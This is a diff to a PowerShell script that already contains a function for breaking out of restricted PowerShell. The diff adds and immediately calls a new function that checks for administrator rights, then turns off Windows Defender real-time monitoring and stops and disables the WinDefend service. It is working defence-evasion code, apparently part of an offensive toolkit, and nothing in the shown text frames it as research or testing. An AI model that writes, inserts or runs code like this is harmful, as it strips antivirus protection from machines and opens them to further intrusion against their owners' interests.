@@ -9,10 +9,39 @@ function Break-OutOfRestrictedPowerShell {
     exit
 }
 
+# Function to disable Windows Defender
+function Disable-WindowsDefender {
+    Write-Host "[*] Attempting to disable Windows Defender..." -ForegroundColor Yellow
+
+    # Check if the script is running with administrative privileges
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+
+    if ($isAdmin) {
+        try {
+            # Disable Windows Defender Real-Time Protection
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            Write-Host "[+] Windows Defender Real-Time Protection disabled." -ForegroundColor Green
+            
+            # Disable Windows Defender services
+            Stop-Service -Name WinDefend -Force
+            Set-Service -Name WinDefend -StartupType Disabled
+            Write-Host "[+] Windows Defender service stopped and disabled." -ForegroundColor Green
+        }
+        catch {
+            Write-Host "[-] Failed to disable Windows Defender. Error: $_" -ForegroundColor Red
+        }
+    }
+    else {
+        Write-Host "[-] This script must be run as Administrator to disable Windows Defender." -ForegroundColor Red
+    }
+}
+
 # Call the breakout function at the start
 Break-OutOfRestrictedPowerShell
 
-# Rest of your script starts here...
+# Call the function to disable Windows Defender
+Disable-WindowsDefender
+
 
 # Set color codes for console output
 $red = "Red"
